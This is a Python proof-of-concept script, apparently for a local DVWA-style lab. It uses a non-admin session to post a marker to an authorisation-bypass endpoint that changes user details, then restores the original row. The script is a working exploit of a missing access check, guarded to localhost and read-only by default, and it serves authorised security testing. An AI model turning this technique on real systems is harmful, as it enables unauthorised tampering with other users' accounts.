#!/usr/bin/env python3
'''AUTH-001 F2 draft: a non-admin session posts change_user_details.php.
Read-only unless --allow-write is passed; the original row is captured from
get_user_data.php, a harmless marker is written, re-read independently and
restored in a finally block. Local authorised lab only.
'''
import argparse, http.client, json, sys
from urllib.parse import urlparse

READ = '/vulnerabilities/authbypass/get_user_data.php'
WRITE = '/vulnerabilities/authbypass/change_user_details.php'


def fail(message):
    print('ERROR: ' + message, file=sys.stderr)
    sys.exit(2)


def call(base, method, path, cookie, body, timeout):
    cls = http.client.HTTPSConnection if base.scheme == 'https' else http.client.HTTPConnection
    conn = cls(base.hostname, base.port, timeout=timeout)
    headers = {'Accept': 'application/json', 'Cookie': cookie, 'Connection': 'close'}
    if body is not None:
        headers['Content-Type'] = 'application/json'
    try:
        conn.request(method, path, body=body, headers=headers)
        response = conn.getresponse()
        return response.status, response.read().decode('utf-8', 'replace')
    except (OSError, http.client.HTTPException) as exc:
        fail('request failed for %s %s: %s' % (method, path, exc))
    finally:
        conn.close()


def read_users(base, cookie, timeout):
    status, text = call(base, 'GET', READ, cookie, None, timeout)
    try:
        data = json.loads(text)
    except ValueError:
        fail('read endpoint returned non-JSON (status=%s): %r' % (status, text[:200]))
    if isinstance(data, dict):
        return status, data, None
    rows = {}
    for row in data:
        if isinstance(row, dict) and 'user_id' in row:
            rows[str(row['user_id'])] = {'first_name': row.get('first_name'), 'surname': row.get('surname')}
    return status, None, rows


def update(base, cookie, user_id, first_name, surname, timeout):
    body = json.dumps({'id': user_id, 'first_name': first_name, 'surname': surname})
    status, text = call(base, 'POST', WRITE, cookie, body, timeout)
    try:
        return status, json.loads(text)
    except ValueError:
        fail('write endpoint returned non-JSON (status=%s): %r' % (status, text[:200]))


ap = argparse.ArgumentParser()
ap.add_argument('--base-url', required=True)
ap.add_argument('--session-file', required=True)
ap.add_argument('--security-level', default='low')
ap.add_argument('--target-id', required=True)
ap.add_argument('--allow-write', action='store_true')
ap.add_argument('--marker', default='A1POC')
ap.add_argument('--timeout', type=float, default=10.0)
args = ap.parse_args()

base = urlparse(args.base_url)
if base.scheme not in ('http', 'https'):
    fail('base URL must be http or https')
if (base.hostname or '').lower() not in ('localhost', '127.0.0.1', '::1'):
    fail('only localhost, 127.0.0.1 or ::1 are permitted')
with open(args.session_file, 'r', encoding='utf-8') as handle:
    cookie = handle.readline().strip()
if '=' not in cookie:
    fail('session file must contain a Cookie value such as PHPSESSID=...')
cookie = cookie + '; security=' + args.security_level

status, denied, rows = read_users(base, cookie, args.timeout)
if denied is not None:
    print('READ_DENIED status=%s error=%r' % (status, denied.get('error')))
    sys.exit(1)
original = rows.get(str(args.target_id))
if original is None:
    fail('target-id was not returned by the read endpoint')
print('ORIGINAL id=%s first_name=%r surname=%r' % (args.target_id, original['first_name'], original['surname']))
if original['first_name'] is None or original['surname'] is None:
    fail('original row is missing first_name or surname')
if not args.allow_write:
    print('WRITE_SKIPPED pass --allow-write to test the update endpoint')
    sys.exit(0)
if len(args.marker) > 5:
    fail('marker must be at most 5 characters; the users column width is not given by the packets')

marker_seen = False
restored = False
try:
    status, reply = update(base, cookie, args.target_id, args.marker, original['surname'], args.timeout)
    print('WRITE_REPLY status=%s reply=%r' % (status, reply))
    if not (isinstance(reply, dict) and reply.get('result') == 'ok'):
        print('WRITE_NOT_ACCEPTED')
        sys.exit(1)
    _, _, after = read_users(base, cookie, args.timeout)
    current = after.get(str(args.target_id)) if after else None
    marker_seen = bool(current) and current.get('first_name') == args.marker
    print('MARKER_OBSERVED=%s row=%r' % (marker_seen, current))
finally:
    status, reply = update(base, cookie, args.target_id, original['first_name'], original['surname'], args.timeout)
    _, _, back = read_users(base, cookie, args.timeout)
    current = back.get(str(args.target_id)) if back else None
    restored = bool(current) and current.get('first_name') == original['first_name'] and current.get('surname') == original['surname']
    print('RESTORE_REPLY status=%s reply=%r' % (status, reply))
    print('RESTORED=%s final=%r' % (restored, current))

sys.exit(0 if marker_seen and restored else 1)